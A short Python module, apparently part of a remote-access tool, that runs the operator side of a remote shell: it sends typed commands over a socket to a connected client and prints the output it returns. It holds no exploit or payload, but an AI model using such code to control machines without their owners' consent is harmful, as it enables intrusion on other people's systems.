#!/usr/bin/python3.7
# -*- coding: utf-8 -*-
# @Author  : Cr4y0n
# @Software: PyCharm
# @Time    : 2020/8/20 13:57

from lib.dsSocket import *
from lib.dsPrint import *

class Shell:
    def __init__(self, clientSocket, sendBufferSize = 4096, recvBufferSize = 8192):
        self.clientSocket = clientSocket
        self.sendBufferSize = sendBufferSize
        self.recvBufferSize = recvBufferSize
        DShellSend(self.clientSocket, "shell")

    def shell(self):
        while True:
            title = DShellRecv(self.clientSocket)
            while True:
                # cmd = input(title.strip(r"\n"))
                cmd = input("\033[42m" + title.strip() + "\033[0m" + "> ")
                if cmd != "":
                    break
            DShellSend(self.clientSocket, cmd)
            if cmd.lower() in ["quit", "q", "exit"]:
                # print(Colors.RED + "[-]" + Colors.END + " OS Shell Closed !")
                errorPrint("OS Shell Closed !")
                return 0
            result = DShellRecv(self.clientSocket)
            print(result)


